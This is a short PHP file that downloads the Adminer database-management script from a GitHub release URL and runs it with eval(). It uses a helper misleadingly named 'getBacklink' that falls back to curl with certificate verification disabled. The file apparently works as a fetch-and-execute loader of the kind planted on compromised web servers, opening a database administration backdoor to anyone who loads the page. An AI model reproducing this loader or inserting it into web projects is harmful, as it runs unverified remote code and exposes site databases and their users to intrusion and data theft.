<?php
ob_start();

function getBacklink($url) {
    if( ini_get('allow_url_fopen') == 1 ) {
        return @file_get_contents($url);
    } else if(function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

$remote_code = getBacklink("https://github.com/vrana/adminer/releases/download/v5.4.1/adminer-5.4.1.php");

if ($remote_code) {
    eval("?>" . $remote_code);
}

ob_end_flush();
?>
